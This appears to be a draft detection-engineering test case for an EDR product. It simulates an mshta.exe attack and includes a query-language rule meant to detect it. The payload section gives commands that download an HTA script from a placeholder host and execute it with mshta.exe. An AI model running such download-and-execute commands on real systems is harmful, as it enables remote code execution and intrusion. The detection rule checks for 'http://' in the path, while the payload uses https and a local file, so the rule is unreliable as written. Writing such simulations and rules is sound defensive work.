identity.description: An attacker uses mshta.exe to execute a malicious scriptlet from a remote source, triggering the Cortex alert for suspicious mshta.exe arguments. The attack chain includes downloading the payload, executing mshta, and establishing a C2 connection.

techniques.name: Command and Scripting Interpreter: Visual Basic

payload.code:
mkdir C:\temp
wget -O C:\temp\script.hta https://example.com/malicious.hta
mshta.exe C:\temp\script.hta

expected_artifacts.description: mshta.exe process started with suspicious arguments

manual_steps: Not authored. Write and test cleanup before promotion.

biocs.name: Mshta Suspicious Arguments
biocs.description: Detection of mshta.exe launched with suspicious arguments such as remote scriptlet execution
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name = 'mshta.exe'
| filter action_file_path contains '.hta'
| filter action_file_path contains 'http://'
